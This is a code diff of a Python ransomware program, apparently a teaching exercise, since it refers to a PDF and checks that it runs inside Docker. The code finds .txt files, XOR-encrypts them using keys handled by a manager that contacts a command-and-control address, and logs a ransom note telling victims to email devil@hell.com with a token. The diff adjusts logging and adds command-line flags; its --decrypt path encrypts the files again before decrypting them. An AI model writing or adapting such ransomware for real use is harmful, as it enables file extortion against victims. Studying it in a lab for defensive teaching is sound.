@@ -23,13 +23,14 @@ ENCRYPT_MESSAGE = """
  |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                 | |                      __/ |                                               __/ |
                 |_|                     |___/                                               |___/ 
-
-Your txt files have been locked. Send an email to devil@hell.com with title '{token}' to unlock your data. 
 """
+
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
+        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+
 
     def check_hostname_is_docker(self) -> None:
         # At first, we check if we are in a docker
@@ -57,24 +58,34 @@ class Ransomware:
 
     def encrypt(self) -> None:
         # main function for encrypting (see PDF)
-        self._log.info(self.get_files("*.txt"))
-        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+        self._log.debug("PASSING THROUGH encrypt() FUNCTION!!!!")
+        self._log.debug(self.get_files("*.txt"))
         self._secret_manager.setup()
         self._secret_manager.xorfiles(self.get_files("*.txt"))
         token = self._secret_manager.get_hex_token()
-        print(ENCRYPT_MESSAGE)
+        self._log.info(ENCRYPT_MESSAGE)
+        self._log.info(f"Your txt files have been encrypted. Send an email to devil@hell.com with title {token} to retrieve your data.")
         return None
         
 
     def decrypt(self):
         # main function for decrypting (see PDF)
+        self._log.info("PASSING THROUGH decrypt() FUNCTION!!!!")
+
         self._secret_manager.xorfiles(self.get_files("*.txt"))
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.DEBUG)
-    if len(sys.argv) < 2:
+    print(sys.argv)
+
+    if "--verbose" in sys.argv:
+        logging.basicConfig(level=logging.DEBUG)
+    else:
+        logging.basicConfig(level=logging.INFO)
+    
+    if not "--decrypt" in sys.argv:
         ransomware = Ransomware()
         ransomware.encrypt()
-    elif sys.argv[1] == "--decrypt":
+    elif "--decrypt" in sys.argv:
         ransomware = Ransomware()
+        ransomware.encrypt()
         ransomware.decrypt()
